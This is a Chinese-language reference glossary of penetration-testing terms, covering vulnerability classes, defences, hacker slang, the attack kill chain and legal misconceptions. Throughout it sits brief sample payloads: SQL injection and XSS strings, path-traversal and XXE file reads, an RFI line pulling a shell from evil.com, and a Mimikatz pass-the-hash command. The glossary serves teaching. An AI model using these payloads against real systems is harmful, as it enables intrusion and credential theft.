## 1. 基础概念

### 1.1 核心术语

**渗透测试 (Penetration Testing / Pentest)**
```
定义: 模拟黑客攻击，评估系统安全性的授权测试活动
别名: 渗透、PT、安全测试
示例: "我们需要对新上线的系统做一次完整的渗透测试"
```

**漏洞 (Vulnerability / Vuln)**
```
定义: 系统中可被利用的安全缺陷
分类: 
  - 高危漏洞 (Critical)
  - 中危漏洞 (Medium)  
  - 低危漏洞 (Low)
示例: "发现了一个SQL注入漏洞，CVSS评分9.8"
```

**利用 (Exploit)**
```
定义: 利用漏洞进行攻击的代码或方法
类型:
  - 0day Exploit: 未公开的漏洞利用
  - 1day Exploit: 已公开但未修复的漏洞利用
  - Nday Exploit: 已修复但仍有系统未打补丁
示例: "使用公开的EternalBlue exploit攻击未打补丁的系统"
```

**Payload (载荷)**
```
定义: 攻击成功后执行的恶意代码
常见类型:
  - Reverse Shell: 反向连接
  - Bind Shell: 绑定端口
  - Meterpreter: Metasploit的高级payload
示例: "使用msfvenom生成一个reverse_tcp payload"
```

### 1.2 测试类型

**黑盒测试 (Black Box Testing)**
```
特点: 不了解内部结构，模拟外部攻击者
优势: 真实模拟攻击场景
劣势: 覆盖率可能不全
```

**白盒测试 (White Box Testing)**
```
特点: 完全了解系统架构和源代码
优势: 覆盖率高，能发现深层漏洞
劣势: 成本高，耗时长
```

**灰盒测试 (Gray Box Testing)**
```
特点: 部分了解系统信息
应用: 最常见的测试方式
平衡: 效率和覆盖率的折中
```

## 2. 攻击者分类

### 2.1 帽子颜色

**白帽 (White Hat)**
```
定义: 合法的安全研究人员
工作: 漏洞挖掘、渗透测试、安全咨询
特点: 遵守法律，获得授权
示例: "我是一名白帽黑客，专注于Web安全研究"
```

**黑帽 (Black Hat)**
```
定义: 恶意攻击者
行为: 非法入侵、数据窃取、勒索
特点: 违法犯罪
```

**灰帽 (Gray Hat)**
```
定义: 介于白帽和黑帽之间
行为: 未授权测试，但不恶意破坏
争议: 法律边缘地带
```

**红帽 (Red Hat)**
```
定义: 激进的白帽，主动攻击黑帽
行为: 反击恶意攻击者
```

**绿帽 (Green Hat)**
```
定义: 新手黑客
特点: 学习阶段，经验不足
```

### 2.2 团队角色

**红队 (Red Team)**
```
角色: 攻击方
任务: 模拟真实攻击，测试防御能力
技能: 渗透测试、社会工程、物理入侵
```

**蓝队 (Blue Team)**
```
角色: 防御方
任务: 监控、检测、响应安全事件
技能: 日志分析、威胁情报、应急响应
```

**紫队 (Purple Team)**
```
角色: 红蓝协作
任务: 提升整体安全水平
方式: 攻防演练、知识共享
```

## 3. 漏洞相关

### 3.1 漏洞编号

**CVE (Common Vulnerabilities and Exposures)**
```
格式: CVE-年份-编号
示例: CVE-2021-44228 (Log4Shell)
查询: https://cve.mitre.org/
```

**CNVD (中国国家信息安全漏洞库)**
```
格式: CNVD-年份-编号
示例: CNVD-2021-12345
查询: https://www.cnvd.org.cn/
```

**CNNVD (中国国家信息安全漏洞共享平台)**
```
格式: CNNVD-年份-编号
用途: 国内官方漏洞库
```

### 3.2 漏洞评分

**CVSS (Common Vulnerability Scoring System)**
```
评分范围: 0.0 - 10.0
分级:
  9.0-10.0  严重 (Critical)
  7.0-8.9   高危 (High)
  4.0-6.9   中危 (Medium)
  0.1-3.9   低危 (Low)

计算因素:
  - 攻击向量 (AV): 网络/相邻/本地/物理
  - 攻击复杂度 (AC): 低/高
  - 权限要求 (PR): 无/低/高
  - 用户交互 (UI): 无/需要
  - 影响范围: 机密性/完整性/可用性
```

### 3.3 漏洞类型

**0day (Zero-day)**
```
定义: 未公开的漏洞，厂商不知道
价值: 极高，可能价值数十万美元
风险: 无补丁可用
示例: "发现了一个Windows 0day，已提交给微软"
```

**1day**
```
定义: 已公开但未广泛修复的漏洞
时间窗口: 公开到大规模修复之间
风险: 高，容易被利用
```

**Nday**
```
定义: 已有补丁但仍有大量未修复系统
原因: 补丁管理不善
示例: "EternalBlue虽然已修复，但仍有大量系统存在漏洞"
```

## 4. 攻击技术

### 4.1 信息收集

**OSINT (Open Source Intelligence)**
```
定义: 开源情报收集
来源: 公开网站、社交媒体、搜索引擎
工具: Google Hacking, Shodan, theHarvester
示例: "通过OSINT收集到目标公司的邮箱格式"
```

**踩点 (Footprinting)**
```
定义: 收集目标系统的基础信息
内容: 域名、IP、子域名、端口、服务
阶段: 渗透测试的第一步
```

**指纹识别 (Fingerprinting)**
```
定义: 识别目标系统的具体版本和配置
类型:
  - 主动指纹: 发送特定请求
  - 被动指纹: 分析响应特征
工具: Nmap, Wappalyzer, WhatWeb
```

### 4.2 漏洞利用

**RCE (Remote Code Execution)**
```
定义: 远程代码执行
危害: 最严重的漏洞类型
示例: "通过反序列化漏洞实现RCE"
```

**LFI (Local File Inclusion)**
```
定义: 本地文件包含
利用: 读取服务器本地文件
示例: ?file=../../../../etc/passwd
```

**RFI (Remote File Inclusion)**
```
定义: 远程文件包含
利用: 包含远程恶意文件
示例: ?file=http://evil.com/shell.php
```

**XXE (XML External Entity)**
```
定义: XML外部实体注入
危害: 读取文件、SSRF、DoS
示例:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**SSRF (Server-Side Request Forgery)**
```
定义: 服务器端请求伪造
利用: 让服务器访问内网资源
示例: ?url=http://127.0.0.1:6379/
```

### 4.3 权限提升

**提权 (Privilege Escalation)**
```
类型:
  - 垂直提权: 普通用户 -> 管理员
  - 水平提权: 用户A -> 用户B

常见方法:
  - 内核漏洞利用
  - SUID程序滥用
  - 计划任务劫持
  - 服务配置错误
```

**UAC Bypass**
```
定义: 绕过Windows用户账户控制
方法: DLL劫持、白名单程序滥用
示例: "使用eventvwr.exe绕过UAC"
```

### 4.4 持久化

**后门 (Backdoor)**
```
定义: 维持访问权限的隐蔽通道
类型:
  - Web后门: Webshell
  - 系统后门: 服务、计划任务
  - 硬件后门: BIOS、固件
```

**Rootkit**
```
定义: 隐藏恶意程序的工具集
级别:
  - 用户态Rootkit
  - 内核态Rootkit
  - Bootkit (引导级)
```

**C2 (Command and Control)**
```
定义: 命令与控制服务器
功能: 远程控制被入侵系统
工具: Cobalt Strike, Empire, Sliver
```

## 5. 防御技术

### 5.1 防护设备

**WAF (Web Application Firewall)**
```
定义: Web应用防火墙
功能: 过滤HTTP/HTTPS流量
厂商: ModSecurity, Cloudflare, 阿里云WAF
绕过: 编码、分块传输、协议走私
```

**IDS (Intrusion Detection System)**
```
定义: 入侵检测系统
模式: 被动监控，只告警不阻断
类型:
  - NIDS: 网络入侵检测
  - HIDS: 主机入侵检测
工具: Snort, Suricata
```

**IPS (Intrusion Prevention System)**
```
定义: 入侵防御系统
模式: 主动防御，可阻断攻击
区别: IDS的升级版
```

**EDR (Endpoint Detection and Response)**
```
定义: 端点检测与响应
功能: 监控终端行为，检测威胁
特点: 比传统杀毒软件更智能
产品: CrowdStrike, Carbon Black
```

### 5.2 安全机制

**ASLR (Address Space Layout Randomization)**
```
定义: 地址空间布局随机化
目的: 防止内存攻击
绕过: 信息泄露、暴力破解
```

**DEP (Data Execution Prevention)**
```
定义: 数据执行保护
目的: 防止栈/堆上代码执行
绕过: ROP (Return-Oriented Programming)
```

**Canary (栈保护)**
```
定义: 栈溢出保护机制
原理: 在返回地址前放置随机值
检测: 返回前检查canary是否被修改
```

### 5.3 加固技术

**最小权限原则 (Principle of Least Privilege)**
```
定义: 只授予完成任务所需的最小权限
应用: 用户权限、服务权限、文件权限
```

**纵深防御 (Defense in Depth)**
```
定义: 多层防御策略
层次: 网络层、主机层、应用层、数据层
理念: 单点失效不会导致整体沦陷
```

**零信任架构 (Zero Trust)**
```
原则: 永不信任，始终验证
特点: 不区分内外网，所有访问都需验证
实现: 微隔离、持续认证、最小权限
```

## 7. 网络术语

### 7.1 网络攻击

**DDoS (Distributed Denial of Service)**
```
定义: 分布式拒绝服务攻击
类型:
  - SYN Flood
  - UDP Flood
  - HTTP Flood
  - DNS放大攻击
防御: CDN、流量清洗、限流
```

**ARP欺骗 (ARP Spoofing)**
```
定义: 伪造ARP响应，劫持流量
用途: 中间人攻击、局域网嗅探
工具: arpspoof, Ettercap
```

**DNS劫持 (DNS Hijacking)**
```
定义: 篡改DNS解析结果
类型:
  - 本地hosts劫持
  - 路由器DNS劫持
  - ISP DNS劫持
```

### 7.2 代理与隧道

**正向代理 (Forward Proxy)**
```
定义: 客户端配置代理访问外网
用途: 翻墙、隐藏真实IP
示例: Shadowsocks, V2Ray
```

**反向代理 (Reverse Proxy)**
```
定义: 服务器端代理，对客户端透明
用途: 负载均衡、缓存、安全防护
示例: Nginx, Apache
```

**隧道 (Tunnel)**
```
定义: 在公网上建立加密通道
类型:
  - SSH隧道
  - VPN隧道
  - HTTP隧道
  - DNS隧道
```

**端口转发 (Port Forwarding)**
```
定义: 将一个端口的流量转发到另一个端口
场景: 内网穿透、绕过防火墙
工具: SSH, Netcat, Socat
```

## 8. Web安全

### 8.1 注入攻击

**SQL注入 (SQL Injection)**
```
定义: 在SQL查询中注入恶意代码
类型:
  - 联合注入 (UNION)
  - 布尔盲注 (Boolean-based)
  - 时间盲注 (Time-based)
  - 报错注入 (Error-based)
  - 堆叠注入 (Stacked)

示例:
  ' OR '1'='1
  ' UNION SELECT NULL,NULL,NULL--
  ' AND SLEEP(5)--
```

**XSS (Cross-Site Scripting)**
```
定义: 跨站脚本攻击
类型:
  - 反射型XSS: 参数直接回显
  - 存储型XSS: 存储到数据库
  - DOM型XSS: 前端JS处理不当

示例:
  <script>alert(document.cookie)</script>
  <img src=x onerror=alert(1)>
```

**CSRF (Cross-Site Request Forgery)**
```
定义: 跨站请求伪造
原理: 利用用户已登录的身份执行操作
防御: CSRF Token, SameSite Cookie
示例:
  <img src="http://bank.com/transfer?to=hacker&amount=1000">
```

### 8.2 认证与会话

**会话劫持 (Session Hijacking)**
```
定义: 窃取用户会话标识
方法:
  - XSS窃取Cookie
  - 网络嗅探
  - 会话固定
```

**JWT (JSON Web Token)**
```
结构: Header.Payload.Signature
漏洞:
  - 弱密钥
  - 算法混淆 (alg: none)
  - 密钥泄露
```

**OAuth**
```
定义: 开放授权协议
漏洞:
  - redirect_uri劫持
  - CSRF攻击
  - 授权码泄露
```

### 8.3 文件安全

**文件上传漏洞**
```
绕过方法:
  - 双写后缀: shell.php.jpg
  - 大小写: shell.PhP
  - 空字节: shell.php%00.jpg
  - MIME类型伪造
  - 解析漏洞
```

**文件包含漏洞**
```
利用方式:
  - 包含日志文件
  - 包含session文件
  - 包含/proc/self/environ
  - PHP伪协议: php://filter, php://input
```

**目录遍历 (Path Traversal)**
```
示例:
  ../../etc/passwd
  ..\..\windows\system32\config\sam
  ....//....//etc/passwd (绕过过滤)
```

## 9. 系统安全

### 9.1 Windows安全

**域渗透 (Domain Penetration)**
```
关键概念:
  - DC (Domain Controller): 域控制器
  - AD (Active Directory): 活动目录
  - GPO (Group Policy Object): 组策略对象
  - Kerberos: 认证协议
```

**Pass the Hash (PTH)**
```
定义: 使用NTLM哈希直接认证
工具: Mimikatz, Impacket
命令: sekurlsa::pth /user:admin /ntlm:hash /domain:domain.com
```

**Golden Ticket (黄金票据)**
```
定义: 伪造Kerberos TGT
条件: 需要krbtgt账户的NTLM哈希
效果: 域内任意权限
```

**Silver Ticket (白银票据)**
```
定义: 伪造Kerberos TGS
范围: 针对特定服务
优势: 不需要与DC通信
```

### 9.2 Linux安全

**SUID提权**
```
定义: 利用SUID位的可执行文件提权
查找: find / -perm -4000 -type f 2>/dev/null
常见: /bin/bash, /usr/bin/find, /usr/bin/vim
```

**Cron任务劫持**
```
位置:
  /etc/crontab
  /etc/cron.d/
  /var/spool/cron/
利用: 修改定时任务脚本
```

**内核漏洞提权**
```
工具: linux-exploit-suggester
常见: DirtyCow, DirtyPipe
查询: uname -a 查看内核版本
```

### 9.3 容器安全

**Docker逃逸**
```
方法:
  - 特权容器 (--privileged)
  - 挂载宿主机目录
  - 内核漏洞
  - Docker API未授权访问
```

**Kubernetes安全**
```
攻击面:
  - API Server未授权
  - etcd数据泄露
  - kubelet未授权
  - RBAC配置错误
```

## 10. 密码学

### 10.1 加密算法

**对称加密**
```
定义: 加密和解密使用相同密钥
算法:
  - AES (Advanced Encryption Standard)
  - DES (已淘汰)
  - 3DES
  - ChaCha20
优势: 速度快
劣势: 密钥分发困难
```

**非对称加密**
```
定义: 公钥加密，私钥解密
算法:
  - RSA
  - ECC (椭圆曲线)
  - DSA
应用: 数字签名、密钥交换
```

**哈希算法**
```
特点: 单向、不可逆
算法:
  - MD5 (已破解，不安全)
  - SHA-1 (已破解)
  - SHA-256 (安全)
  - SHA-3
  - bcrypt (密码存储)
```

### 10.2 密码攻击

**暴力破解 (Brute Force)**
```
定义: 尝试所有可能的密码组合
工具: Hydra, Medusa, John the Ripper
防御: 账户锁定、验证码、限流
```

**字典攻击 (Dictionary Attack)**
```
定义: 使用常见密码字典
字典: rockyou.txt, top10000.txt
优化: 根据目标定制字典
```

**彩虹表 (Rainbow Table)**
```
定义: 预计算的哈希表
用途: 快速破解哈希
防御: 加盐 (Salt)
```

**哈希传递 (Pass the Hash)**
```
定义: 直接使用哈希值认证
适用: Windows NTLM认证
工具: Mimikatz, Impacket
```

## 11. 社会工程

### 11.1 攻击手法

**钓鱼 (Phishing)**
```
类型:
  - 邮件钓鱼: 伪造邮件
  - 网站钓鱼: 伪造登录页面
  - 短信钓鱼 (Smishing)
  - 语音钓鱼 (Vishing)
工具: SET, Gophish, EvilGinx
```

**鱼叉式钓鱼 (Spear Phishing)**
```
定义: 针对特定目标的定向钓鱼
特点: 高度定制化，成功率高
准备: 深入的OSINT调查
```

**水坑攻击 (Watering Hole)**
```
定义: 攻击目标常访问的网站
原理: 在合法网站植入恶意代码
示例: 攻击行业论坛、新闻网站
```

**诱饵 (Baiting)**
```
定义: 使用诱饵引诱目标
形式:
  - USB设备: 丢弃在停车场
  - 免费WiFi
  - 虚假软件下载
```

### 11.2 心理技巧

**权威 (Authority)**
```
原理: 人们倾向于服从权威
示例: 冒充IT管理员、高层领导
```

**紧迫性 (Urgency)**
```
原理: 制造紧急情况，让目标仓促决策
示例: "您的账户将在24小时内被冻结"
```

**互惠 (Reciprocity)**
```
原理: 人们倾向于回报他人的善意
示例: 先提供帮助，再提出请求
```

## 12. 行业黑话

### 12.1 常用术语

**打点**
```
含义: 寻找突破口，获取初始访问权限
示例: "先打点进内网，再横向移动"
```

**上线**
```
含义: 目标主机连接到C2服务器
示例: "目标已上线，获得Meterpreter会话"
```

**落地**
```
含义: 恶意文件成功写入目标系统
示例: "Payload已落地，等待执行"
```

**横向移动 (Lateral Movement)**
```
含义: 在内网中从一台主机移动到另一台
方法: PTH, WMI, PsExec, RDP
示例: "通过域管理员权限横向到其他服务器"
```

**权限维持 (Persistence)**
```
含义: 保持对目标系统的持久访问
方法: 后门、计划任务、服务、注册表
示例: "添加计划任务实现权限维持"
```

**痕迹清理 (Covering Tracks)**
```
含义: 删除攻击痕迹，避免被发现
内容: 日志清理、文件删除、进程隐藏
示例: "清理Windows事件日志"
```

### 12.2 技术俚语

**Shell**
```
含义: 命令行访问权限
类型:
  - Webshell: Web后门
  - Reverse Shell: 反向连接
  - Bind Shell: 绑定端口
示例: "拿到一个Webshell"
```

**肉鸡 (Bot)**
```
含义: 被控制的计算机
用途: DDoS攻击、代理跳板
集合: 僵尸网络 (Botnet)
```

**跳板 (Pivot)**
```
含义: 作为中转的主机
用途: 隐藏真实IP、访问内网
示例: "通过跳板机访问内网数据库"
```

**免杀 (AV Bypass)**
```
含义: 绕过杀毒软件检测
方法:
  - 加壳
  - 混淆
  - 加密
  - 内存加载
示例: "对Payload进行免杀处理"
```

**沙箱 (Sandbox)**
```
含义: 隔离的测试环境
用途: 恶意软件分析、漏洞测试
产品: Cuckoo, Any.run
```

### 12.3 攻击阶段

**侦察 (Reconnaissance)**
```
阶段: 第一阶段
任务: 收集目标信息
方法: OSINT, 端口扫描, 指纹识别
```

**武器化 (Weaponization)**
```
阶段: 第二阶段
任务: 制作攻击载荷
产物: Exploit + Payload
```

**投递 (Delivery)**
```
阶段: 第三阶段
任务: 将载荷发送给目标
方式: 钓鱼邮件, 水坑攻击, USB
```

**利用 (Exploitation)**
```
阶段: 第四阶段
任务: 触发漏洞，执行代码
结果: 获得初始访问权限
```

**安装 (Installation)**
```
阶段: 第五阶段
任务: 安装后门，建立持久化
目的: 长期控制
```

**命令与控制 (Command and Control)**
```
阶段: 第六阶段
任务: 与被控主机通信
协议: HTTP, HTTPS, DNS, ICMP
```

**目标达成 (Actions on Objectives)**
```
阶段: 第七阶段
任务: 完成攻击目标
行动: 数据窃取, 破坏, 勒索
```

## 14. 常见误区

### 14.1 技术误区

**误区1: 扫描器能发现所有漏洞**
```
现实: 扫描器只能发现已知漏洞和常见配置错误
盲区: 业务逻辑漏洞、0day漏洞、复杂的漏洞链
正确做法: 扫描器 + 手工测试
```

**误区2: 有WAF就安全**
```
现实: WAF可以被绕过
绕过方法:
  - 编码变换
  - 协议走私
  - 逻辑漏洞
  - 0day漏洞
正确做法: 纵深防御，不依赖单一防护
```

**误区3: 内网是安全的**
```
现实: 内网攻击更容易
原因:
  - 内网防护薄弱
  - 信任关系复杂
  - 横向移动容易
正确做法: 零信任架构，内网也要严格防护
```

**误区4: 改端口就安全**
```
现实: 端口扫描很容易
工具: Nmap, Masscan可以快速扫描全端口
正确做法: 端口 + 认证 + 防火墙
```

### 14.2 法律误区

**误区5: 未授权测试是学习**
```
现实: 未授权访问是违法的
法律: 《网络安全法》《刑法》
后果: 刑事责任
正确做法: 必须获得书面授权
```

**误区6: 白帽就可以随意测试**
```
现实: 白帽也需要授权
SRC规则: 遵守漏洞提交规范
禁止: 数据窃取、破坏、传播
正确做法: 负责任的漏洞披露
```

**误区7: 境外服务器就没事**
```
现实: 跨境攻击也违法
管辖: 长臂管辖、引渡条约
案例: 多起跨境黑客被抓
正确做法: 遵守法律，不要心存侥幸
```

### 14.3 实战误区

**误区8: 工具万能论**
```
现实: 工具只是辅助
限制:
  - 工具有局限性
  - 需要理解原理
  - 需要手工验证
正确做法: 理解原理 + 灵活运用工具
```

**误区9: 漏洞越多越好**
```
现实: 质量比数量重要
评估:
  - 漏洞的危害程度
  - 利用的难易程度
  - 业务影响
正确做法: 关注高危漏洞和漏洞链
```

**误区10: 拿到Shell就结束**
```
现实: 后渗透才是重点
任务:
  - 权限提升
  - 横向移动
  - 数据收集
  - 权限维持
正确做法: 完整的渗透测试流程
```

## 15. 实战场景术语

### 15.1 红蓝对抗

**ATT&CK框架**
```
全称: Adversarial Tactics, Techniques & Common Knowledge
组织: MITRE
内容: 14个战术，200+技术
用途: 威胁建模、攻防演练
```

**TTP (Tactics, Techniques, and Procedures)**
```
定义: 攻击者的战术、技术和程序
用途: 威胁情报、攻击归因
示例: APT组织的TTP分析
```

**IOC (Indicator of Compromise)**
```
定义: 入侵指标
类型:
  - 文件哈希
  - IP地址
  - 域名
  - 注册表键值
用途: 威胁检测、事件响应
```

**TTPs vs IOCs**
```
IOCs: 容易改变，检测容易失效
TTPs: 相对稳定，检测更持久
趋势: 从IOC检测转向TTP检测
```

### 15.2 应急响应

**IR (Incident Response)**
```
定义: 安全事件响应
阶段:
  1. 准备 (Preparation)
  2. 识别 (Identification)
  3. 遏制 (Containment)
  4. 根除 (Eradication)
  5. 恢复 (Recovery)
  6. 总结 (Lessons Learned)
```

**取证 (Forensics)**
```
类型:
  - 磁盘取证
  - 内存取证
  - 网络取证
  - 日志取证
原则: 保持证据完整性
工具: FTK, EnCase, Volatility
```

**溯源 (Attribution)**
```
定义: 追踪攻击者身份
依据:
  - IP地址
  - 工具特征
  - TTP
  - 语言特征
难度: 非常困难，容易被误导
```

### 15.3 威胁情报

**CTI (Cyber Threat Intelligence)**
```
定义: 网络威胁情报
层次:
  - 战略情报: 高层决策
  - 战术情报: 攻击手法
  - 技术情报: IOC、规则
  - 运营情报: 日常运营
```

**APT (Advanced Persistent Threat)**
```
定义: 高级持续性威胁
特点:
  - 有组织、有资源
  - 长期潜伏
  - 针对性强
  - 技术先进
示例: APT28, APT29, APT41
```

**0day市场**
```
买家: 政府、情报机构、黑客组织
价格: 数万到数百万美元
平台: Zerodium, 暗网市场
争议: 道德和法律问题
```
